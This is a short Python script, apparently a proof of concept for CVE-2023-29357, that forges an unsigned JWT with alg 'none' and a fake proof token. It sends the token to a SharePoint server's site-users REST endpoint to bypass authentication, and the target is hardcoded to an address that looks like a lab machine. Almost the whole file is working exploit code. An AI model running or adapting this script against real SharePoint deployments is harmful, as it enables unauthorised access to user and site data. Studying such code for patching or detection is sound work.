#!/usr/bin/env python3
"""
Test JWT 'none' algorithm authentication bypass (CVE-2023-29357)
Purpose: Test if SharePoint accepts unsigned JWT tokens to bypass authentication
"""
import json
import time
import base64
import requests
import sys
from urllib.parse import urlparse

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def create_jwt_token(realm, client_id):
    """Create JWT token with algorithm 'none' (no signature)"""
    header = {"alg": "none"}
    current_time = int(time.time())
    expiration_time = current_time + 3600
    
    payload = {
        "aud": f"{client_id}@{realm}",
        "iss": client_id,
        "nbf": current_time,
        "exp": expiration_time,
        "ver": "hashedprooftoken",
        "nameid": f"{client_id}@{realm}",
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": 1,
        "isloopback": True
    }
    
    # Base64url encode without padding
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    
    jwt_token = f"{encoded_header.decode()}.{encoded_payload.decode()}.AAA"
    return jwt_token

def test_auth_bypass(target_url, realm, client_id):
    """Test authentication bypass with forged JWT token"""
    jwt_token = create_jwt_token(realm, client_id)
    
    print(f"[*] Created JWT token: {jwt_token[:80]}...")
    print(f"[*] Testing authentication bypass at: {target_url}/_api/web/siteusers")
    
    headers = {
        "Accept": "application/json",
        "Authorization": f"Bearer {jwt_token}",
        "X-PROOF_TOKEN": jwt_token,
    }
    
    response = requests.get(
        f"{target_url}/_api/web/siteusers",
        headers=headers,
        verify=False,
        timeout=30
    )
    
    print(f"\n[*] Status Code: {response.status_code}")
    print(f"[*] Headers: {dict(response.headers)}")
    print(f"[*] Response Body (first 500 chars):\n{response.text[:500]}")
    
    if response.status_code == 200:
        print("\n[!!!] SUCCESS - Authentication bypassed!")
        print("[!!!] JWT 'none' algorithm vulnerability confirmed!")
        return True
    else:
        print("\n[-] FAILURE - Authentication bypass blocked")
        return False

if __name__ == "__main__":
    target_url = "http://10.10.10.166"
    realm = "5637f856-255d-4039-b165-224f3371d1d4"
    client_id = "00000003-0000-0ff1-ce00-000000000000"
    
    test_auth_bypass(target_url, realm, client_id)
